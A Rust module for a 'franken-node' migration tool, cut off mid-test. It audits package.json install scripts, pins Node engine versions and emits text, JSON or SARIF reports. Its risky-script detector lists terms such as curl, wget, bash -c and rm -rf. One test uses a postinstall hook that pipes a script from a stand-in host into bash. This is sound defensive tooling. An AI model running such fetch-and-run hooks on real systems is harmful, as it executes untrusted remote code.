//! Migration admission/progression controls.
//!
//! This module hosts deterministic migration policy gates used to decide
//! whether topology risk deltas are acceptable before and during rollout.

use serde::{Deserialize, Serialize};
use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

#[cfg(any(test, feature = "extended-surfaces"))]
#[allow(dead_code)]
pub mod bpet_migration_gate;
#[cfg(any(test, feature = "extended-surfaces"))]
#[allow(dead_code)]
pub mod dgis_migration_gate;

const MAX_FINDINGS_PER_CATEGORY: usize = 16;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AuditOutputFormat {
    Json,
    Text,
    Sarif,
}

impl AuditOutputFormat {
    pub fn parse(raw: &str) -> Result<Self, String> {
        match raw.trim().to_ascii_lowercase().as_str() {
            "json" => Ok(Self::Json),
            "text" => Ok(Self::Text),
            "sarif" => Ok(Self::Sarif),
            other => Err(format!(
                "unsupported migrate audit format `{other}`; expected one of: json, text, sarif"
            )),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationSeverity {
    Info,
    Low,
    Medium,
    High,
}

impl MigrationSeverity {
    const fn rank(self) -> u8 {
        match self {
            Self::High => 4,
            Self::Medium => 3,
            Self::Low => 2,
            Self::Info => 1,
        }
    }

    const fn as_sarif_level(self) -> &'static str {
        match self {
            Self::High => "error",
            Self::Medium | Self::Low => "warning",
            Self::Info => "note",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationCategory {
    Project,
    Dependencies,
    Scripts,
    Runtime,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditFinding {
    pub id: String,
    pub category: MigrationCategory,
    pub severity: MigrationSeverity,
    pub message: String,
    pub path: Option<String>,
    pub recommendation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditSummary {
    pub files_scanned: usize,
    pub js_files: usize,
    pub ts_files: usize,
    pub package_manifests: usize,
    pub risky_scripts: usize,
    pub lockfiles: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationAuditReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub summary: MigrationAuditSummary,
    pub findings: Vec<MigrationAuditFinding>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum MigrationRewriteAction {
    PinNodeEngine,
    ManualScriptReview,
    ManifestReadError,
    ManifestParseError,
    NoPackageManifest,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteEntry {
    pub id: String,
    pub path: Option<String>,
    pub action: MigrationRewriteAction,
    pub detail: String,
    pub applied: bool,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackEntry {
    pub path: String,
    pub original_content: String,
    pub rewritten_content: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRewriteReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub package_manifests_scanned: usize,
    pub rewrites_planned: usize,
    pub rewrites_applied: usize,
    pub manual_review_items: usize,
    pub entries: Vec<MigrationRewriteEntry>,
    pub rollback_entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationRollbackPlan {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub apply_mode: bool,
    pub entry_count: usize,
    pub entries: Vec<MigrationRollbackEntry>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MigrationValidateStatus {
    Pass,
    Fail,
}

impl MigrationValidateStatus {
    const fn as_str(self) -> &'static str {
        match self {
            Self::Pass => "PASS",
            Self::Fail => "FAIL",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidationCheck {
    pub id: String,
    pub passed: bool,
    pub message: String,
    pub remediation: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct MigrationValidateReport {
    pub schema_version: String,
    pub project_path: String,
    pub generated_at_utc: String,
    pub status: MigrationValidateStatus,
    pub checks: Vec<MigrationValidationCheck>,
    pub blocking_findings: Vec<MigrationAuditFinding>,
    pub warning_findings: Vec<MigrationAuditFinding>,
}

impl MigrationValidateReport {
    #[must_use]
    pub const fn is_pass(&self) -> bool {
        matches!(self.status, MigrationValidateStatus::Pass)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ScriptFindingKind {
    Risky,
    MissingNodeEngine,
}

fn ensure_migration_project_path(project_path: &Path, operation: &str) -> anyhow::Result<()> {
    if !project_path.exists() {
        anyhow::bail!(
            "migration {operation} target does not exist: {}",
            project_path.display()
        );
    }
    if !project_path.is_dir() {
        anyhow::bail!(
            "migration {operation} target must be a directory: {}",
            project_path.display()
        );
    }
    Ok(())
}

pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
    ensure_migration_project_path(project_path, "audit")?;

    let files: Vec<PathBuf> = collect_project_files(project_path)?;
    let mut findings = Vec::new();
    let mut summary = MigrationAuditSummary {
        files_scanned: 0,
        js_files: 0,
        ts_files: 0,
        package_manifests: 0,
        risky_scripts: 0,
        lockfiles: Vec::new(),
    };
    let mut lockfiles = BTreeSet::new();
    let mut scripts_flagged = 0_usize;
    let mut engine_gaps = 0_usize;

    for path in files {
        summary.files_scanned = summary.files_scanned.saturating_add(1);
        let relative_path = relative_display(project_path, &path);

        if let Some(name) = path.file_name().and_then(std::ffi::OsStr::to_str) {
            if is_lockfile(name) {
                lockfiles.insert(relative_path.clone());
            }
            if name == "package.json" {
                summary.package_manifests = summary.package_manifests.saturating_add(1);
                inspect_package_manifest(
                    &path,
                    &relative_path,
                    &mut findings,
                    &mut scripts_flagged,
                    &mut engine_gaps,
                );
            }
        }

        if let Some(ext) = path.extension().and_then(std::ffi::OsStr::to_str) {
            match ext.to_ascii_lowercase().as_str() {
                "js" | "cjs" | "mjs" | "jsx" => {
                    summary.js_files = summary.js_files.saturating_add(1)
                }
                "ts" | "tsx" => summary.ts_files = summary.ts_files.saturating_add(1),
                _ => {}
            }
        }
    }

    summary.risky_scripts = scripts_flagged;
    summary.lockfiles = lockfiles.into_iter().collect();
    append_summary_findings(&summary, engine_gaps, &mut findings);
    sort_and_assign_ids(&mut findings);

    Ok(MigrationAuditReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        summary,
        findings,
    })
}

pub fn render_audit_report(
    report: &MigrationAuditReport,
    format: AuditOutputFormat,
) -> anyhow::Result<String> {
    match format {
        AuditOutputFormat::Json => serde_json::to_string_pretty(report)
            .map_err(|err| anyhow::anyhow!("failed to serialize migration audit JSON: {err}")),
        AuditOutputFormat::Text => Ok(render_human_audit_report(report)),
        AuditOutputFormat::Sarif => render_sarif(report),
    }
}

pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<MigrationRewriteReport> {
    ensure_migration_project_path(project_path, "rewrite")?;

    let files: Vec<PathBuf> = collect_project_files(project_path)?;
    let mut package_manifests_scanned = 0_usize;
    let mut rewrites_planned = 0_usize;
    let mut rewrites_applied = 0_usize;
    let mut manual_review_items = 0_usize;
    let mut entries = Vec::new();
    let mut rollback_entries = Vec::new();

    for path in files {
        let is_package_manifest = path
            .file_name()
            .and_then(std::ffi::OsStr::to_str)
            .is_some_and(|name| name == "package.json");
        if !is_package_manifest {
            continue;
        }

        package_manifests_scanned = package_manifests_scanned.saturating_add(1);
        let relative_path = relative_display(project_path, &path);
        let raw = match std::fs::read_to_string(&path) {
            Ok(content) => content,
            Err(err) => {
                manual_review_items = manual_review_items.saturating_add(1);
                entries.push(MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path),
                    action: MigrationRewriteAction::ManifestReadError,
                    detail: format!("unable to read package manifest: {err}"),
                    applied: false,
                });
                continue;
            }
        };

        let mut manifest = match serde_json::from_str::<serde_json::Value>(&raw) {
            Ok(value) => value,
            Err(err) => {
                manual_review_items = manual_review_items.saturating_add(1);
                entries.push(MigrationRewriteEntry {
                    id: String::new(),
                    path: Some(relative_path),
                    action: MigrationRewriteAction::ManifestParseError,
                    detail: format!("package manifest JSON parse failed: {err}"),
                    applied: false,
                });
                continue;
            }
        };

        for script_name in collect_risky_script_names(&manifest) {
            manual_review_items = manual_review_items.saturating_add(1);
            entries.push(MigrationRewriteEntry {
                id: String::new(),
                path: Some(relative_path.clone()),
                action: MigrationRewriteAction::ManualScriptReview,
                detail: format!("script `{script_name}` requires manual hardening review"),
                applied: false,
            });
        }

        if ensure_node_engine_pin(&mut manifest) {
            rewrites_planned = rewrites_planned.saturating_add(1);
            let rewritten = serde_json::to_string_pretty(&manifest)
                .map(|rendered| format!("{rendered}\n"))
                .map_err(|err| {
                    anyhow::anyhow!(
                        "failed serializing rewritten package manifest {}: {err}",
                        relative_path
                    )
                })?;

            if apply {
                std::fs::write(&path, rewritten.as_bytes()).map_err(|err| {
                    anyhow::anyhow!(
                        "failed writing rewritten package manifest {}: {err}",
                        path.display()
                    )
                })?;
                rewrites_applied = rewrites_applied.saturating_add(1);
            }

            entries.push(MigrationRewriteEntry {
                id: String::new(),
                path: Some(relative_path.clone()),
                action: MigrationRewriteAction::PinNodeEngine,
                detail: "set engines.node to >=20 <23 to reduce migration runtime drift"
                    .to_string(),
                applied: apply,
            });
            rollback_entries.push(MigrationRollbackEntry {
                path: relative_path,
                original_content: raw,
                rewritten_content: rewritten,
            });
        }
    }

    if package_manifests_scanned == 0 {
        manual_review_items = manual_review_items.saturating_add(1);
        entries.push(MigrationRewriteEntry {
            id: String::new(),
            path: None,
            action: MigrationRewriteAction::NoPackageManifest,
            detail: "no package.json files found; nothing to rewrite".to_string(),
            applied: false,
        });
    }

    entries.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then_with(|| left.action.cmp(&right.action))
            .then_with(|| left.detail.cmp(&right.detail))
    });
    for (index, entry) in entries.iter_mut().enumerate() {
        entry.id = format!("mig-rewrite-{:03}", index + 1);
    }

    Ok(MigrationRewriteReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: apply,
        package_manifests_scanned,
        rewrites_planned,
        rewrites_applied,
        manual_review_items,
        entries,
        rollback_entries,
    })
}

#[must_use]
pub fn build_rollback_plan(report: &MigrationRewriteReport) -> MigrationRollbackPlan {
    MigrationRollbackPlan {
        schema_version: "1.0.0".to_string(),
        project_path: report.project_path.clone(),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        apply_mode: report.apply_mode,
        entry_count: report.rollback_entries.len(),
        entries: report.rollback_entries.clone(),
    }
}

#[must_use]
pub fn render_rewrite_report(report: &MigrationRewriteReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate rewrite");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(
        &mut output,
        "mode: {}",
        if report.apply_mode {
            "apply"
        } else {
            "dry-run"
        }
    );
    let _ = writeln!(
        &mut output,
        "summary: manifests={} rewrites_planned={} rewrites_applied={} manual_review_items={}",
        report.package_manifests_scanned,
        report.rewrites_planned,
        report.rewrites_applied,
        report.manual_review_items
    );

    if report.entries.is_empty() {
        let _ = writeln!(&mut output, "entries: none");
        return output;
    }

    let _ = writeln!(&mut output, "entries ({}):", report.entries.len());
    for entry in &report.entries {
        let _ = writeln!(
            &mut output,
            "- [{}:{:?}] {}{} (applied={})",
            entry.id,
            entry.action,
            entry.detail,
            entry
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})")),
            entry.applied
        );
    }

    output
}

pub fn run_validate(project_path: &Path) -> anyhow::Result<MigrationValidateReport> {
    let audit = run_audit(project_path)?;

    let blocking_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::High))
        .cloned()
        .collect::<Vec<_>>();
    let warning_findings = audit
        .findings
        .iter()
        .filter(|finding| matches!(finding.severity, MigrationSeverity::Medium))
        .cloned()
        .collect::<Vec<_>>();

    let mut checks = Vec::new();
    checks.push(MigrationValidationCheck {
        id: "mig-validate-001".to_string(),
        passed: audit.summary.package_manifests > 0,
        message: format!(
            "package manifests detected: {}",
            audit.summary.package_manifests
        ),
        remediation: Some(
            "Ensure at least one package.json is present before validation.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-002".to_string(),
        passed: !audit.summary.lockfiles.is_empty(),
        message: format!("lockfiles detected: {}", audit.summary.lockfiles.len()),
        remediation: Some(
            "Commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb)."
                .to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-003".to_string(),
        passed: audit.summary.risky_scripts == 0,
        message: format!(
            "risky install/build scripts: {}",
            audit.summary.risky_scripts
        ),
        remediation: Some(
            "Remove or harden risky install/build hooks before migration rollout.".to_string(),
        ),
    });
    checks.push(MigrationValidationCheck {
        id: "mig-validate-004".to_string(),
        passed: blocking_findings.is_empty(),
        message: format!("high-severity audit findings: {}", blocking_findings.len()),
        remediation: Some(
            "Resolve all high-severity migrate audit findings before validation can pass."
                .to_string(),
        ),
    });

    let status = if checks.iter().all(|check| check.passed) {
        MigrationValidateStatus::Pass
    } else {
        MigrationValidateStatus::Fail
    };

    Ok(MigrationValidateReport {
        schema_version: "1.0.0".to_string(),
        project_path: project_path.to_string_lossy().replace('\\', "/"),
        generated_at_utc: chrono::Utc::now().to_rfc3339(),
        status,
        checks,
        blocking_findings,
        warning_findings,
    })
}

#[must_use]
pub fn render_validate_report(report: &MigrationValidateReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate validate");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "status: {}", report.status.as_str());
    let _ = writeln!(
        &mut output,
        "summary: checks={} blocking_findings={} warning_findings={}",
        report.checks.len(),
        report.blocking_findings.len(),
        report.warning_findings.len()
    );
    let _ = writeln!(&mut output, "checks:");
    for check in &report.checks {
        let _ = writeln!(
            &mut output,
            "- [{}] {} {}",
            check.id,
            if check.passed { "PASS" } else { "FAIL" },
            check.message
        );
        if !check.passed
            && let Some(remediation) = &check.remediation
        {
            let _ = writeln!(&mut output, "  remediation: {remediation}");
        }
    }

    if !report.blocking_findings.is_empty() {
        let _ = writeln!(
            &mut output,
            "blocking findings ({}):",
            report.blocking_findings.len()
        );
        for finding in &report.blocking_findings {
            let _ = writeln!(
                &mut output,
                "- [{}] {}{}",
                finding.id,
                finding.message,
                finding
                    .path
                    .as_ref()
                    .map_or_else(String::new, |path| format!(" (path: {path})"))
            );
        }
    }

    output
}

fn collect_project_files(root: &Path) -> anyhow::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let mut pending = vec![root.to_path_buf()];

    while let Some(dir) = pending.pop() {
        let entries = std::fs::read_dir(&dir)
            .map_err(|err| anyhow::anyhow!("failed to read directory {}: {err}", dir.display()))?;

        for entry in entries {
            let entry = entry.map_err(|err| {
                anyhow::anyhow!("failed to read directory entry in {}: {err}", dir.display())
            })?;
            let path = entry.path();
            let file_type = entry.file_type().map_err(|err| {
                anyhow::anyhow!("failed to read file type for {}: {err}", path.display())
            })?;
            if file_type.is_symlink() {
                continue;
            }
            if file_type.is_dir() {
                if should_skip_dir(&path) {
                    continue;
                }
                pending.push(path);
            } else if file_type.is_file() {
                files.push(path);
            }
        }
    }

    files.sort();
    Ok(files)
}

fn should_skip_dir(path: &Path) -> bool {
    path.file_name()
        .and_then(std::ffi::OsStr::to_str)
        .is_some_and(|name| {
            matches!(
                name,
                ".git" | "target" | "node_modules" | ".beads" | ".venv" | ".next"
            )
        })
}

fn is_lockfile(name: &str) -> bool {
    matches!(
        name,
        "package-lock.json"
            | "npm-shrinkwrap.json"
            | "pnpm-lock.yaml"
            | "yarn.lock"
            | "bun.lockb"
            | "bun.lock"
    )
}

fn inspect_package_manifest(
    manifest_path: &Path,
    relative_path: &str,
    findings: &mut Vec<MigrationAuditFinding>,
    scripts_flagged: &mut usize,
    engine_gaps: &mut usize,
) {
    let raw = match std::fs::read_to_string(manifest_path) {
        Ok(content) => content,
        Err(err) => {
            findings.push(MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::Medium,
                message: format!("failed to read package manifest: {err}"),
                path: Some(relative_path.to_string()),
                recommendation: Some(
                    "Ensure package.json is readable so migration audit can classify dependencies."
                        .to_string(),
                ),
            });
            return;
        }
    };

    let parsed: serde_json::Value = match serde_json::from_str(&raw) {
        Ok(value) => value,
        Err(err) => {
            findings.push(MigrationAuditFinding {
                id: String::new(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: format!("invalid package.json JSON: {err}"),
                path: Some(relative_path.to_string()),
                recommendation: Some(
                    "Fix package.json syntax before running migration rewrite/validate."
                        .to_string(),
                ),
            });
            return;
        }
    };

    if parsed
        .get("engines")
        .and_then(serde_json::Value::as_object)
        .and_then(|engines| engines.get("node"))
        .is_none()
    {
        *engine_gaps = engine_gaps.saturating_add(1);
        push_capped_script_finding(
            findings,
            ScriptFindingKind::MissingNodeEngine,
            relative_path,
            *engine_gaps,
        );
    }

    if let Some(scripts) = parsed.get("scripts").and_then(serde_json::Value::as_object) {
        for (script_name, command_value) in scripts {
            let Some(command) = command_value.as_str() else {
                continue;
            };
            if is_risky_script(script_name, command) {
                *scripts_flagged = scripts_flagged.saturating_add(1);
                push_capped_script_finding(
                    findings,
                    ScriptFindingKind::Risky,
                    relative_path,
                    *scripts_flagged,
                );
            }
        }
    }
}

fn push_capped_script_finding(
    findings: &mut Vec<MigrationAuditFinding>,
    kind: ScriptFindingKind,
    relative_path: &str,
    count: usize,
) {
    if count > MAX_FINDINGS_PER_CATEGORY {
        return;
    }

    let (category, severity, message, recommendation) = match kind {
        ScriptFindingKind::Risky => (
            MigrationCategory::Scripts,
            MigrationSeverity::High,
            "risky install/build script pattern detected in package.json".to_string(),
            "Replace dynamic install hooks with deterministic build steps before migration."
                .to_string(),
        ),
        ScriptFindingKind::MissingNodeEngine => (
            MigrationCategory::Runtime,
            MigrationSeverity::Low,
            "package.json is missing engines.node version pin".to_string(),
            "Add engines.node to reduce runtime drift during migration verification.".to_string(),
        ),
    };

    findings.push(MigrationAuditFinding {
        id: String::new(),
        category,
        severity,
        message,
        path: Some(relative_path.to_string()),
        recommendation: Some(recommendation),
    });
}

fn is_risky_script(script_name: &str, command: &str) -> bool {
    let script = script_name.to_ascii_lowercase();
    let cmd = command.to_ascii_lowercase();
    let install_hook = matches!(script.as_str(), "preinstall" | "install" | "postinstall");
    let risky_terms = [
        "curl ",
        "wget ",
        "chmod +x",
        "bash -c",
        "powershell ",
        "sudo ",
        "rm -rf",
        "node-gyp",
    ];

    install_hook || risky_terms.iter().any(|term| cmd.contains(term))
}

fn ensure_node_engine_pin(manifest: &mut serde_json::Value) -> bool {
    let Some(root) = manifest.as_object_mut() else {
        return false;
    };
    let engines = root
        .entry("engines".to_string())
        .or_insert_with(|| serde_json::json!({}));

    let Some(engines_obj) = engines.as_object_mut() else {
        return false;
    };

    if engines_obj
        .get("node")
        .and_then(serde_json::Value::as_str)
        .is_some_and(|value| !value.trim().is_empty())
    {
        return false;
    }

    engines_obj.insert("node".to_string(), serde_json::json!(">=20 <23"));
    true
}

fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
    let mut risky: Vec<String> = Vec::new();
    if let Some(scripts) = manifest
        .get("scripts")
        .and_then(serde_json::Value::as_object)
    {
        for (script_name, command_value) in scripts {
            if let Some(command) = command_value.as_str()
                && is_risky_script(script_name, command)
            {
                risky.push(script_name.to_string());
            }
        }
    }
    risky.sort();
    risky
}

fn append_summary_findings(
    summary: &MigrationAuditSummary,
    engine_gaps: usize,
    findings: &mut Vec<MigrationAuditFinding>,
) {
    if summary.package_manifests == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Project,
            severity: MigrationSeverity::High,
            message: "no package.json files found in target project".to_string(),
            path: None,
            recommendation: Some(
                "Initialize a package manifest before running migrate rewrite/validate."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Project,
            severity: MigrationSeverity::Info,
            message: format!("detected {} package manifest(s)", summary.package_manifests),
            path: None,
            recommendation: None,
        });
    }

    if summary.lockfiles.is_empty() {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Dependencies,
            severity: MigrationSeverity::Medium,
            message: "no JavaScript lockfile detected".to_string(),
            path: None,
            recommendation: Some(
                "Generate and commit a lockfile (package-lock.json, pnpm-lock.yaml, yarn.lock, or bun.lockb) before migration."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Dependencies,
            severity: MigrationSeverity::Info,
            message: format!("detected {} lockfile(s)", summary.lockfiles.len()),
            path: None,
            recommendation: None,
        });
    }

    if summary.js_files == 0 && summary.ts_files == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Low,
            message: "no JavaScript/TypeScript source files found".to_string(),
            path: None,
            recommendation: Some(
                "Confirm the migration target path points to the intended JS/TS project."
                    .to_string(),
            ),
        });
    } else if summary.js_files > 0 && summary.ts_files == 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Medium,
            message: format!(
                "found {} JavaScript files and no TypeScript files",
                summary.js_files
            ),
            path: None,
            recommendation: Some(
                "Prioritize lockstep validation coverage because runtime assumptions are untyped."
                    .to_string(),
            ),
        });
    } else {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Info,
            message: format!(
                "found {} JavaScript and {} TypeScript files",
                summary.js_files, summary.ts_files
            ),
            path: None,
            recommendation: None,
        });
    }

    if summary.risky_scripts > 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Scripts,
            severity: MigrationSeverity::High,
            message: format!(
                "detected {} potentially risky install/build script(s)",
                summary.risky_scripts
            ),
            path: None,
            recommendation: Some(
                "Review and harden install/build scripts before enabling strict trust policy."
                    .to_string(),
            ),
        });
    }

    if engine_gaps > 0 {
        findings.push(MigrationAuditFinding {
            id: String::new(),
            category: MigrationCategory::Runtime,
            severity: MigrationSeverity::Low,
            message: format!("{} package manifest(s) missing engines.node", engine_gaps),
            path: None,
            recommendation: Some(
                "Pin engines.node across packages to improve migration determinism.".to_string(),
            ),
        });
    }
}

fn sort_and_assign_ids(findings: &mut [MigrationAuditFinding]) {
    findings.sort_by(|left, right| {
        right
            .severity
            .rank()
            .cmp(&left.severity.rank())
            .then_with(|| left.category.cmp(&right.category))
            .then_with(|| left.message.cmp(&right.message))
            .then_with(|| left.path.cmp(&right.path))
    });

    for (index, finding) in findings.iter_mut().enumerate() {
        finding.id = format!("mig-audit-{:03}", index + 1);
    }
}

fn relative_display(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .replace('\\', "/")
}

fn render_human_audit_report(report: &MigrationAuditReport) -> String {
    let mut output = String::new();
    let _ = writeln!(&mut output, "franken-node migrate audit");
    let _ = writeln!(&mut output, "target: {}", report.project_path);
    let _ = writeln!(&mut output, "generated_at_utc: {}", report.generated_at_utc);
    let _ = writeln!(
        &mut output,
        "summary: files={} js={} ts={} manifests={} lockfiles={} risky_scripts={}",
        report.summary.files_scanned,
        report.summary.js_files,
        report.summary.ts_files,
        report.summary.package_manifests,
        report.summary.lockfiles.len(),
        report.summary.risky_scripts
    );

    if !report.summary.lockfiles.is_empty() {
        let _ = writeln!(
            &mut output,
            "lockfiles: {}",
            report.summary.lockfiles.join(", ")
        );
    }

    let _ = writeln!(&mut output, "findings ({}):", report.findings.len());
    for finding in &report.findings {
        let _ = writeln!(
            &mut output,
            "- [{}:{}] {}{}",
            finding.id,
            match finding.severity {
                MigrationSeverity::Info => "info",
                MigrationSeverity::Low => "low",
                MigrationSeverity::Medium => "medium",
                MigrationSeverity::High => "high",
            },
            finding.message,
            finding
                .path
                .as_ref()
                .map_or_else(String::new, |path| format!(" (path: {path})"))
        );
        if let Some(recommendation) = &finding.recommendation {
            let _ = writeln!(&mut output, "  recommendation: {recommendation}");
        }
    }

    output
}

fn render_sarif(report: &MigrationAuditReport) -> anyhow::Result<String> {
    let results = report
        .findings
        .iter()
        .map(|finding| {
            serde_json::json!({
                "ruleId": finding.id,
                "level": finding.severity.as_sarif_level(),
                "message": {"text": finding.message},
                "locations": finding.path.as_ref().map(|path| vec![serde_json::json!({
                    "physicalLocation": {"artifactLocation": {"uri": path}}
                })]).unwrap_or_default(),
            })
        })
        .collect::<Vec<_>>();

    let sarif = serde_json::json!({
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "franken-node migrate audit",
                    "informationUri": "https://github.com/Dicklesworthstone/franken_node",
                }
            },
            "invocations": [{
                "executionSuccessful": true
            }],
            "results": results
        }]
    });

    serde_json::to_string_pretty(&sarif)
        .map_err(|err| anyhow::anyhow!("failed to serialize migration audit SARIF: {err}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write_project_file(project: &Path, relative_path: &str, content: &str) {
        let path = project.join(relative_path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).expect("create parent dir");
        }
        std::fs::write(path, content).expect("write project file");
    }

    fn write_hardened_manifest(project: &Path) {
        write_project_file(
            project,
            "package.json",
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "engines":{"node":">=20 <23"},
              "scripts":{"test":"node test.js"}
            }"#,
        );
    }

    fn write_lockfile(project: &Path) {
        write_project_file(project, "package-lock.json", "{}\n");
    }

    #[test]
    fn parse_audit_output_format_is_case_insensitive() {
        assert_eq!(
            AuditOutputFormat::parse("json"),
            Ok(AuditOutputFormat::Json)
        );
        assert_eq!(
            AuditOutputFormat::parse("TEXT"),
            Ok(AuditOutputFormat::Text)
        );
        assert_eq!(
            AuditOutputFormat::parse("Sarif"),
            Ok(AuditOutputFormat::Sarif)
        );
        assert!(AuditOutputFormat::parse("yaml").is_err());
    }

    #[test]
    fn run_audit_flags_risky_scripts_and_missing_lockfiles() {
        let temp = tempfile::tempdir().expect("tempdir");
        let project = temp.path();

        std::fs::write(project.join("index.js"), "console.log('hello');").expect("write js");
        std::fs::write(
            project.join("package.json"),
            r#"{
              "name":"demo",
              "version":"1.0.0",
              "scripts":{"postinstall":"curl https://example.invalid/install.sh | bash"}
            }"#,
        )
        .expect("write package");

        let report = run_audit(project).expect("audit should succeed");

        assert_eq!(report.summary.package_manifests, 1);
        assert_eq!(report.summary.js_files, 1);
        assert_eq!(report.summary.ts_files, 0);
        assert_eq!(report.summary.risky_scripts, 1);
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("risky install/build script"))
        );
        assert!(
            report
                .findings
                .iter()
                .any(|finding| finding.message.contains("no JavaScript lockfile"))
        );
    }

    #[test]
    fn render_text_report_contains_summary_and_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 3,
                js_files: 2,
                ts_files: 1,
                package_manifests: 1,
                risky_scripts: 1,
                lockfiles: vec!["package-lock.json".to_string()],
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Scripts,
                severity: MigrationSeverity::High,
                message: "risky install/build script pattern detected in package.json".to_string(),
                path: Some("package.json".to_string()),
                recommendation: Some("Harden install scripts before rollout.".to_string()),
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Text).expect("text");
        assert!(rendered.contains("franken-node migrate audit"));
        assert!(rendered.contains("summary: files=3 js=2 ts=1 manifests=1 lockfiles=1"));
        assert!(rendered.contains("- [mig-audit-001:high]"));
        assert!(rendered.contains("recommendation: Harden install scripts before rollout."));
    }

    #[test]
    fn render_sarif_emits_findings() {
        let report = MigrationAuditReport {
            schema_version: "1.0.0".to_string(),
            project_path: "/tmp/demo".to_string(),
            generated_at_utc: "2026-02-26T00:00:00Z".to_string(),
            summary: MigrationAuditSummary {
                files_scanned: 1,
                js_files: 1,
                ts_files: 0,
                package_manifests: 0,
                risky_scripts: 0,
                lockfiles: Vec::new(),
            },
            findings: vec![MigrationAuditFinding {
                id: "mig-audit-001".to_string(),
                category: MigrationCategory::Project,
                severity: MigrationSeverity::High,
                message: "no package.json files found in target project".to_string(),
                path: None,
                recommendation: None,
            }],
        };

        let rendered = render_audit_report(&report, AuditOutputFormat::Sarif).expect("sarif");
        let parsed: serde_json::Value = serde_json::from_str(&rendered).expect("valid json");
        let result_count = parsed["runs"][0]["results"]
            .as_array()
            .map_or(0, std::vec::Vec::len);
        assert_eq!(result_count, 1);
